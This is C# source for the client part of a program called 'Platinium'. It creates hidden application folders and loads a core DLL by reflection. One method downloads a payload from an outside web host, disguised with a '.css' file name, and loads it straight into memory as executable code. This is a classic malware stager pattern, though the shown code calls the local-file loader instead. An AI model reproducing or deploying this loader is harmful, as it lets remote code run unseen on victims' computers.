using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PlatiniumClient
{
    class ClientController
    {
        private static string DLL_URL = "http://repositorio123.esy.es/Platinium.css";
        private static string ROOT_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Platinium");
        private static string TEMP_PATH = Path.GetTempPath();
        private static string PLUGINS_PATH = Path.Combine(ROOT_PATH, "plugins");
        private static string CONFIG_PATH = Path.Combine(ROOT_PATH, "config");
        private static string COREASSEMBLY_PATH = Path.Combine(ROOT_PATH, "core");
        private static string COREASSEMBLYFILE_PATH = Path.Combine(COREASSEMBLY_PATH, "Platinium.dll");
        private byte[] raw_assembly;
        private Assembly assembly;
        private Type type;
        public ClientController()
        {
            InitializeEnvironment();
            Initialize();
        }
        private void Initialize()
        {
            type = assembly.GetType("Platinium.Entities.PlatiniumClient");
            object client = Activator.CreateInstance(type);
        }
        private void InitializeEnvironment()
        {
            Directory.CreateDirectory(ROOT_PATH);
            Directory.CreateDirectory(PLUGINS_PATH);
            Directory.CreateDirectory(CONFIG_PATH);
            Directory.CreateDirectory(COREASSEMBLY_PATH);
            //assembly = Assembly.LoadFrom(COREASSEMBLYFILE_PATH);
            StaticEnvironmentLoading();

        }
        private void DynamicEnvironmentLoading()
        {
            using (var client = new WebClient())
            {
                raw_assembly = client.DownloadData(DLL_URL);
            }
            assembly = Assembly.Load(raw_assembly);
        }
        private void StaticEnvironmentLoading()
        {
            assembly = Assembly.LoadFrom(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().ToString()), "Platinium.dll"));
        }
    }
    class Crypt
    {

    }
}
